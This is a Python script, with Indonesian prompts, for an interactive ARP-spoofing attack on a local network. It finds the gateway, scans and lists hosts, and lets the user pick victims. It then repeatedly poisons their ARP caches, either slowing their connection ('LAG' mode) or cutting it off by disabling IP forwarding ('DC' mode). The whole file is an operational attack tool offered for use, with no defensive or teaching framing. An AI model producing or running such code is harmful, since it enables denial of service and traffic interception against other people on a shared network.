import threading, time, os, subprocess
from core import *
from utils import banner

def get_network_info():
    try:
        route_output = subprocess.check_output("ip route | grep default", shell=True).decode()
        parts = route_output.split()
        gw_ip = parts[2]
        iface = parts[4]
        network_prefix = ".".join(gw_ip.split('.')[:-1]) + ".0/24"
        return gw_ip, network_prefix, iface
    except:
        return None, None, None

GATEWAY_IP, NETWORK_SCAN, INTERFACE = get_network_info()
selected_targets = []
intensity = 0.05
attack_mode = "LAG"
is_running = True

def attack_worker(gw_mac):
    while is_running:
        if selected_targets:
            for target in selected_targets:
                poison(target['ip'], target['mac'], GATEWAY_IP, gw_mac)
            time.sleep(intensity if attack_mode == "LAG" else 0.001)

def main():
    global selected_targets, intensity, attack_mode, is_running
    banner()
    if not GATEWAY_IP: 
        print("[-] Gagal mendeteksi Gateway. Pastikan Anda terhubung ke jaringan.")
        return
    
    print(f"[*] Gateway: {GATEWAY_IP} | Interface: {INTERFACE}")
    print(f"[*] Mencari MAC Gateway...")
    gw_mac = get_mac(GATEWAY_IP)
    if not gw_mac: 
        print("[-] Gagal mendapatkan MAC Gateway.")
        return

    # Menjalankan scan agresif
    hosts = scan_network(NETWORK_SCAN)
    
    # Tampilan Tabel Target
    print("\n" + "="*75)
    print(f"{'ID':<4} {'IP ADDRESS':<16} {'VENDOR/MERK':<25} {'MAC ADDRESS'}")
    print("-" * 75)
    
    for i, h in enumerate(hosts):
        # Pewarnaan hijau (92m) untuk merk agar menonjol
        vendor_name = f"\033[92m{h['vendor']}\033[0m"
        print(f"[{i:<2}] {h['ip']:<16} {vendor_name:<34} {h['mac']}")
    print("="*75)

    try:
        choice = input("\nPilih target (index, pisahkan koma): ")
        indices = [int(x.strip()) for x in choice.split(',')]
        selected_targets = [hosts[i] for i in indices]

        print(f"\n[1] LAG Mode (Internet Lemot)")
        print(f"[2] DC Mode  (Internet Putus)")
        mode = input("Pilih Mode: ")
        
        if mode == "2":
            attack_mode = "DC"
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Mode DISCONNECT diaktifkan (IP Forwarding OFF)")
        else:
            attack_mode = "LAG"
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print("[+] Mode LAG diaktifkan (IP Forwarding ON)")

        # Jalankan thread serangan
        t = threading.Thread(target=attack_worker, args=(gw_mac,), daemon=True)
        t.start()
        
        print(f"\n\033[91m[!] Menyerang {len(selected_targets)} target... Tekan Ctrl+C untuk berhenti.\033[0m")
        
        while True:
            time.sleep(1)
            
    except (KeyboardInterrupt, IndexError, ValueError):
        is_running = False
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("\n\n[*] Menghentikan serangan...")
        print("[*] Memulihkan tabel ARP target (Restore)...")
        if selected_targets:
            for t in selected_targets: 
                restore(t['ip'], t['mac'], GATEWAY_IP, gw_mac)
        print("[+] Jaringan pulih. Exit.")

if __name__ == "__main__":
    main()